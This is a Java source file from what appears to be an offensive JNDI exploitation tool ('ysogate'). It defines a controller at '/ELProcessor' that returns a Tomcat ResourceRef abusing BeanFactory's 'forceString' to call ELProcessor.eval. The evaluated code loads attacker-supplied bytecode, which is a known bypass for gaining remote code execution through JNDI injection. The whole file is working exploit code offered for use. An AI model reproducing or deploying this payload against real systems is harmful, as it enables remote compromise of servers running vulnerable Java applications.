package com.h2tg.ysogate.controller.bypass;

import com.h2tg.ysogate.annotation.JNDIController;
import com.h2tg.ysogate.annotation.JNDIMapping;
import com.h2tg.ysogate.controller.BasicController;
import org.apache.naming.ResourceRef;
import javax.naming.StringRefAddr;

import java.util.Base64;

import static com.h2tg.ysogate.bullet.defineClass.ElConverter.el2js;
import static com.h2tg.ysogate.bullet.defineClass.JsConverter.all;

@JNDIController
@JNDIMapping("/ELProcessor")
public class ELProcessorController extends BasicController {
    @Override
    public Object process(Object obj) {
        byte[] byteCode = (byte[]) obj;
        System.out.println("[Reference] Factory: BeanFactory + ELProcessor");
        String code = all(Base64.getEncoder().encodeToString(byteCode));

        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", el2js(code)));
        return ref;
    }
}
